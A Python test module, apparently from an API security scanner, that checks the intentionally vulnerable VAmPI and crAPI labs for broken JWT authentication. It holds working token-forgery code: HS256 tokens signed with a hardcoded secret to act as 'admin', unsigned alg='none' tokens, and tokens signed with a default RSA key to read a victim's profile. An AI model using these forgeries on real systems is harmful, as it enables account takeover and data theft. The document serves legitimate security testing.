"""
Broken Authentication (OWASP API2:2023) tests: JWT weak signing bypass.
"""

from __future__ import annotations

import json
import logging
import random
import uuid
from datetime import datetime, timedelta, timezone
from typing import Any, Optional

import jwt
from cryptography.hazmat.primitives.asymmetric import rsa
from jwt.algorithms import RSAAlgorithm

from src.utils.crapi_client import CrAPIClient
from src.utils.results_logger import RunLogger
from src.utils.vampi_client import VAmPIClient
from src.vulnerabilities.authorization import BOOKS_PATH
from src.vulnerabilities.base import Severity, VulnerabilityResult, VulnerabilityTest

logger = logging.getLogger(__name__)

FORGED_TOKEN_TTL_SECONDS = 3600


class JWTWeakSigningBypassTest(VulnerabilityTest):
    """
    Confirms whether VAmPI's HS256 auth tokens can be forged against the
    hardcoded Flask SECRET_KEY, without ever completing a real login.

    config.py sets `vuln_app.app.config['SECRET_KEY'] = 'random'` as a
    fixed literal, and models/user_model.py signs and verifies every token
    with that same value via `jwt.encode(..., algorithm='HS256')` /
    `jwt.decode(..., algorithms=["HS256"])`. Since PyJWT's `decode()` call
    restricts to `algorithms=["HS256"]`, an unsigned `alg: none` token is a
    separate, independently-tested root cause rather than a variant of the
    weak-secret finding.
    """

    name = "jwt_weak_signing_bypass"
    owasp_category = "API2:2023 Broken Authentication"

    def __init__(self, architecture: str, target: str, client: VAmPIClient) -> None:
        super().__init__(architecture, target)
        self.client = client
        self.weak_secret: str = client.scan_config.get("jwt_weak_secret", "")
        self.control_secret: str = client.scan_config.get(
            "jwt_control_secret", "control-secret-not-guessed"
        )

    def run(self) -> list[VulnerabilityResult]:
        self.client.seed_database()
        results = [self._test_hs256_algorithm_confirmed()]

        book_title = self._discover_existing_book_title()
        if book_title is None:
            results.append(
                self._result(
                    passed=True,
                    severity=Severity.LOW,
                    evidence=(
                        f"Could not discover an existing book title from GET {BOOKS_PATH} "
                        "to use as the protected-endpoint target — inconclusive setup "
                        "step, not itself a finding."
                    ),
                    request_summary=f"GET {BOOKS_PATH}",
                    response_summary="no books returned",
                )
            )
            return results

        results.append(self._test_weak_secret_forgery(book_title))
        results.append(self._test_control_wrong_secret_rejected(book_title))
        results.append(self._test_alg_none_rejected(book_title))
        return results

    # -- setup ---------------------------------------------------------

    def _discover_existing_book_title(self) -> Optional[str]:
        """`GET /books/v1` requires no auth and lists every user's books
        (see authorization.py's BOLA finding) — used here only to obtain a
        real book title to target with a forged token.
        """
        resp = self.client.get(BOOKS_PATH)
        if resp.status_code != 200:
            return None
        try:
            body = resp.json()
        except ValueError:
            return None
        books = body.get("Books", [])
        if not books or not isinstance(books, list):
            return None
        return books[0].get("book_title")

    @staticmethod
    def _forge_token(secret: str, sub: str) -> str:
        now = datetime.now(timezone.utc)
        payload = {
            "exp": now + timedelta(seconds=FORGED_TOKEN_TTL_SECONDS),
            "iat": now,
            "sub": sub,
        }
        return jwt.encode(payload, secret, algorithm="HS256")

    @staticmethod
    def _forge_alg_none_token(sub: str) -> str:
        now = datetime.now(timezone.utc)
        payload = {
            "exp": now + timedelta(seconds=FORGED_TOKEN_TTL_SECONDS),
            "iat": now,
            "sub": sub,
        }
        return jwt.encode(payload, key="", algorithm="none")

    # -- checks ----------------------------------------------------------

    def _test_hs256_algorithm_confirmed(self) -> VulnerabilityResult:
        """Baseline: decode a real, server-issued token's header (without
        verifying its signature) to confirm HS256 is genuinely the
        algorithm in use before the forgery attempts below assume it.
        """
        self.client.register("attacker")
        token = self.client.login("attacker")
        header = jwt.get_unverified_header(token)
        alg = header.get("alg")
        is_hs256 = alg == "HS256"

        evidence = f"Server-issued token header: {header!r}."
        evidence += (
            " Uses HS256, a symmetric algorithm where the same secret both signs "
            "and verifies — consistent with a forgeable, deployment-wide hardcoded key."
            if is_hs256
            else f" Uses {alg!r}, not HS256 — the forgery attempts below assume HS256 and may not apply."
        )

        return self._result(
            passed=True,
            severity=Severity.LOW,
            evidence=evidence,
            request_summary="POST /users/v1/login as_user='attacker'",
            response_summary=f"token alg={alg!r}",
        )

    def _test_weak_secret_forgery(self, book_title: str) -> VulnerabilityResult:
        path = f"{BOOKS_PATH}/{book_title}"
        forged = self._forge_token(self.weak_secret, sub="admin")
        resp = self.client.get(path, token=forged)
        confirmed = resp.status_code == 200

        evidence = (
            f"Forged a token for 'admin' (never logged in this run) signed with "
            f"the hardcoded Flask SECRET_KEY {self.weak_secret!r} -> GET {path} "
            f"returned HTTP {resp.status_code}."
        )
        if confirmed:
            evidence += (
                " Accepted without ever presenting real credentials, confirming the "
                "signing secret is a fixed, guessable literal rather than a "
                "per-deployment random value."
            )

        return self._result(
            passed=not confirmed,
            severity=Severity.CRITICAL if confirmed else Severity.LOW,
            evidence=evidence,
            request_summary=f"GET {path} with forged token (weak secret, sub='admin')",
            response_summary=f"HTTP {resp.status_code}",
            cwe="CWE-321",
        )

    def _test_control_wrong_secret_rejected(
        self, book_title: str
    ) -> VulnerabilityResult:
        """Control: identical forged claims, signed with a different,
        non-guessed secret, must be rejected — otherwise the finding above
        would just mean "any token works", not specifically a weak secret.
        """
        path = f"{BOOKS_PATH}/{book_title}"
        forged = self._forge_token(self.control_secret, sub="admin")
        resp = self.client.get(path, token=forged)
        rejected = resp.status_code == 401

        evidence = (
            f"Control: same forged claims, signed with a different, non-guessed "
            f"secret -> GET {path} returned HTTP {resp.status_code}."
        )
        evidence += (
            " Rejected, confirming the weak-secret result is a genuine key-guessing "
            "bypass and not simply 'any bearer value is accepted'."
            if rejected
            else " NOT rejected — signature verification appears to accept arbitrary secrets."
        )

        return self._result(
            passed=rejected,
            severity=Severity.LOW if rejected else Severity.CRITICAL,
            evidence=evidence,
            request_summary=f"GET {path} with forged token (control secret, sub='admin')",
            response_summary=f"HTTP {resp.status_code}",
        )

    def _test_alg_none_rejected(self, book_title: str) -> VulnerabilityResult:
        """Separate root cause from weak-secret forgery: an unsigned
        `alg: none` token has no secret to guess at all.
        """
        path = f"{BOOKS_PATH}/{book_title}"
        forged = self._forge_alg_none_token(sub="admin")
        resp = self.client.get(path, token=forged)
        rejected = resp.status_code != 200

        evidence = (
            f"Unsigned alg='none' token for 'admin' -> GET {path} returned "
            f"HTTP {resp.status_code}."
        )
        evidence += (
            " Rejected — PyJWT's decode() call is pinned to algorithms=['HS256'], so "
            "alg=none tokens are refused independently of the weak-secret HS256 "
            "forgery confirmed above."
            if rejected
            else " NOT rejected — a second, independent JWT validation gap (alg=none accepted)."
        )

        return self._result(
            passed=rejected,
            severity=Severity.LOW if rejected else Severity.CRITICAL,
            evidence=evidence,
            request_summary=f"GET {path} with alg='none' token, sub='admin'",
            response_summary=f"HTTP {resp.status_code}",
        )


def _fresh_synthetic_login(client: CrAPIClient, role: str) -> None:
    """Sign up and log in a brand-new synthetic identity for `role`.

    crAPI enforces unique email *and* phone number per account and has no
    reseed endpoint, so each test run needs its own fresh identity rather
    than reusing config's static test_users values, which would 403
    ("already registered") on a second run.
    """
    user = client.test_users[role]
    suffix = uuid.uuid4().hex[:10]
    user["email"] = f"{role}.{suffix}@crapi-test.local"
    user["number"] = str(random.randint(6_000_000_000, 6_999_999_999))
    client.signup(role)
    client.login(role)


class JWTSignatureVerificationBypassTest(VulnerabilityTest):
    """
    Confirms whether crapi-identity verifies a JWT's signature before
    trusting its claims, and whether its RSA signing key is itself
    forgeable when that check does happen.

    crapi-identity signs tokens with RS256, not the HS256 the JWT_SECRET
    environment variable's name suggests — that variable is unused for
    token signing. The private key comes from `/app/default_jwks.json`
    inside the crapi-identity image, used whenever docker/keys/ is left
    empty (the case for this project's docker-compose.crapi.yml), and is
    therefore identical across every deployment that hasn't supplied its
    own JWKS.

    `GET /identity/api/v2/user/dashboard` reads the `sub` claim out of the
    JWT payload without verifying the signature at all: an `alg: none`
    token for a victim's email who never logged in this run returns that
    victim's full profile, while the same token with a syntactically
    valid but unregistered email 404s — confirming the route is trusting
    whatever email is handed to it, not authenticating the caller.

    `GET /identity/api/v2/vehicle/vehicles` does check the signature (a
    token signed with an unrelated, freshly-generated RSA key is
    rejected), but accepts a token signed with the default key above,
    confirming that key is the actual root of trust and is not a secret.
    """

    name = "jwt_signature_verification_bypass"
    owasp_category = "API2:2023 Broken Authentication"

    def __init__(self, architecture: str, target: str, client: CrAPIClient) -> None:
        super().__init__(architecture, target)
        self.client = client
        default_jwks: Optional[dict[str, Any]] = client.scan_config.get(
            "jwt_default_jwks"
        )
        self.default_kid: str = (default_jwks or {}).get("kid", "")
        self.default_signing_key = (
            RSAAlgorithm.from_jwk(json.dumps(default_jwks)) if default_jwks else None
        )
        self.dashboard_path: str = client.endpoints.get(
            "dashboard", "/identity/api/v2/user/dashboard"
        )
        self.vehicles_path: str = client.endpoints.get(
            "vehicles", "/identity/api/v2/vehicle/vehicles"
        )

    def run(self) -> list[VulnerabilityResult]:
        _fresh_synthetic_login(self.client, "victim")
        victim_email = self.client.test_users["victim"]["email"]

        results = [self._test_rs256_algorithm_confirmed()]
        if self.default_signing_key is None:
            results.append(
                self._result(
                    passed=True,
                    severity=Severity.LOW,
                    evidence=(
                        "No jwt_default_jwks configured — forgery checks "
                        "skipped, inconclusive."
                    ),
                    request_summary=None,
                    response_summary=None,
                )
            )
            return results

        results.append(self._test_dashboard_alg_none_forgery(victim_email))
        results.append(self._test_dashboard_control_nonexistent_subject_rejected())
        results.append(self._test_vehicles_default_key_forgery(victim_email))
        results.append(self._test_vehicles_control_wrong_key_rejected(victim_email))
        return results

    # -- forging -----------------------------------------------------------

    @staticmethod
    def _forge_rs256_token(key: Any, kid: str, sub: str) -> str:
        now = datetime.now(timezone.utc)
        payload = {
            "sub": sub,
            "iat": now,
            "exp": now + timedelta(seconds=FORGED_TOKEN_TTL_SECONDS),
            "role": "user",
        }
        headers = {"kid": kid} if kid else {}
        return jwt.encode(payload, key, algorithm="RS256", headers=headers)

    @staticmethod
    def _forge_alg_none_token(sub: str) -> str:
        now = datetime.now(timezone.utc)
        payload = {
            "sub": sub,
            "iat": now,
            "exp": now + timedelta(seconds=FORGED_TOKEN_TTL_SECONDS),
            "role": "user",
        }
        return jwt.encode(payload, key="", algorithm="none")

    # -- checks --------------------------------------------------------------

    def _test_rs256_algorithm_confirmed(self) -> VulnerabilityResult:
        """Baseline: decode a real, server-issued token's header (without
        verifying its signature) to confirm RS256 is genuinely the
        algorithm in use before the forgery attempts below assume it.
        """
        token = self.client.login("victim")
        header = jwt.get_unverified_header(token)
        alg = header.get("alg")
        kid = header.get("kid")
        is_rs256 = alg == "RS256"

        evidence = f"Server-issued token header: {header!r}."
        evidence += (
            " Uses RS256, an asymmetric algorithm — verifying a token only "
            "needs the public half of the keypair, so a forgery attempt "
            "requires either the private key itself or a validator that "
            "skips signature checking entirely."
            if is_rs256
            else f" Uses {alg!r}, not RS256 — the forgery attempts below assume RS256 and may not apply."
        )

        return self._result(
            passed=True,
            severity=Severity.LOW,
            evidence=evidence,
            request_summary="POST /identity/api/auth/login as_user='victim'",
            response_summary=f"token alg={alg!r} kid={kid!r}",
        )

    def _test_dashboard_alg_none_forgery(
        self, victim_email: str
    ) -> VulnerabilityResult:
        forged = self._forge_alg_none_token(sub=victim_email)
        resp = self.client.get(self.dashboard_path, token=forged)
        confirmed = (
            resp.status_code == 200
            and self._parse_json(resp).get("email") == victim_email
        )

        evidence = (
            f"Unsigned alg='none' token for victim's email (never presented "
            f"with victim's password in this run) -> GET {self.dashboard_path} "
            f"returned HTTP {resp.status_code}."
        )
        if confirmed:
            evidence += (
                " Returned the victim's full profile despite the token "
                "carrying no signature at all — this route does not verify "
                "JWT signatures before trusting the `sub` claim."
            )

        return self._result(
            passed=not confirmed,
            severity=Severity.CRITICAL if confirmed else Severity.LOW,
            evidence=evidence,
            request_summary=f"GET {self.dashboard_path} with alg='none' token, sub=victim's email",
            response_summary=f"HTTP {resp.status_code}",
            cwe="CWE-347",
        )

    def _test_dashboard_control_nonexistent_subject_rejected(
        self,
    ) -> VulnerabilityResult:
        """Control: the same unsigned-token technique with a syntactically
        valid but never-registered email must fail — otherwise the result
        above would just mean "this route returns arbitrary data", not
        specifically "this route trusts a forged identity claim".
        """
        nonexistent = f"nonexistent_{uuid.uuid4().hex[:10]}@crapi-test.local"
        forged = self._forge_alg_none_token(sub=nonexistent)
        resp = self.client.get(self.dashboard_path, token=forged)
        rejected = resp.status_code == 404

        evidence = (
            f"Same unsigned alg='none' technique with a never-registered "
            f"email -> GET {self.dashboard_path} returned HTTP {resp.status_code}."
        )
        evidence += (
            " Not found, as expected — confirms the leak above is specifically "
            "because a real victim's email was trusted from the forged claim, "
            "not because this route returns arbitrary data regardless of input."
            if rejected
            else " NOT rejected — inconsistent with the nonexistent-subject baseline."
        )

        return self._result(
            passed=rejected,
            severity=Severity.LOW if rejected else Severity.MEDIUM,
            evidence=evidence,
            request_summary=f"GET {self.dashboard_path} with alg='none' token, sub=nonexistent email",
            response_summary=f"HTTP {resp.status_code}",
        )

    def _test_vehicles_default_key_forgery(
        self, victim_email: str
    ) -> VulnerabilityResult:
        forged = self._forge_rs256_token(
            self.default_signing_key, self.default_kid, sub=victim_email
        )
        resp = self.client.get(self.vehicles_path, token=forged)
        confirmed = resp.status_code == 200

        evidence = (
            f"Token for victim's email, signed with crapi-identity's default "
            f"RSA key (baked into the image, never presented with victim's "
            f"password in this run) -> GET {self.vehicles_path} returned "
            f"HTTP {resp.status_code}."
        )
        if confirmed:
            evidence += (
                " Accepted — this route does verify signatures (see control "
                "below) but the signing key itself is a fixed value shipped "
                "in the public Docker image, not a per-deployment secret."
            )

        return self._result(
            passed=not confirmed,
            severity=Severity.CRITICAL if confirmed else Severity.LOW,
            evidence=evidence,
            request_summary=f"GET {self.vehicles_path} with forged token (default key, sub=victim's email)",
            response_summary=f"HTTP {resp.status_code}",
            cwe="CWE-321",
        )

    def _test_vehicles_control_wrong_key_rejected(
        self, victim_email: str
    ) -> VulnerabilityResult:
        """Control: identical forged claims, signed with a different,
        freshly-generated RSA key, must be rejected — otherwise the
        default-key result above would just mean "any signature works",
        not specifically that the default key is guessable.
        """
        wrong_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        forged = self._forge_rs256_token(wrong_key, self.default_kid, sub=victim_email)
        resp = self.client.get(self.vehicles_path, token=forged)
        rejected = resp.status_code == 401

        evidence = (
            f"Control: same forged claims, signed with a different, "
            f"freshly-generated RSA key -> GET {self.vehicles_path} returned "
            f"HTTP {resp.status_code}."
        )
        evidence += (
            " Rejected, confirming the default-key result is a genuine "
            "hardcoded-key bypass and not simply 'any signature is accepted'."
            if rejected
            else " NOT rejected — signature verification appears to accept arbitrary keys."
        )

        return self._result(
            passed=rejected,
            severity=Severity.LOW if rejected else Severity.CRITICAL,
            evidence=evidence,
            request_summary=f"GET {self.vehicles_path} with forged token (unrelated key, sub=victim's email)",
            response_summary=f"HTTP {resp.status_code}",
        )

    @staticmethod
    def _parse_json(resp: Any) -> dict[str, Any]:
        try:
            return resp.json()
        except ValueError:
            return {}


def _print_results(results: list[VulnerabilityResult]) -> None:
    for result in results:
        status = "PASS" if result.passed else f"FAIL ({result.severity.value.upper()})"
        print(f"[{status}] {result.test_name} - {result.owasp_category}")
        print(f"  Evidence:  {result.evidence}")
        print(f"  Request:   {result.request_summary}")
        print(f"  Response:  {result.response_summary}")
        print()


def _run_vampi() -> None:
    client = VAmPIClient.from_config("config/vampi.yaml")
    with RunLogger("rest", "vampi", "config/vampi.yaml") as run:
        results = JWTWeakSigningBypassTest(
            architecture="rest", target="vampi", client=client
        ).run()
        run.log_results(results)
    _print_results(results)


def _run_crapi() -> None:
    client = CrAPIClient.from_config("config/crapi.yaml")
    with RunLogger("rest", "crapi", "config/crapi.yaml") as run:
        results = JWTSignatureVerificationBypassTest(
            architecture="rest", target="crapi", client=client
        ).run()
        run.log_results(results)
    _print_results(results)


if __name__ == "__main__":
    import argparse

    logging.basicConfig(level=logging.INFO)

    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--target",
        choices=["vampi", "crapi", "all"],
        default="all",
        help=(
            "Which target's container must be up. Default 'all' requires both "
            "docker-compose.vampi.yml and docker-compose.crapi.yml to be running "
            "— pass --target to run just one."
        ),
    )
    args = parser.parse_args()

    if args.target in ("vampi", "all"):
        _run_vampi()
    if args.target in ("crapi", "all"):
        _run_crapi()
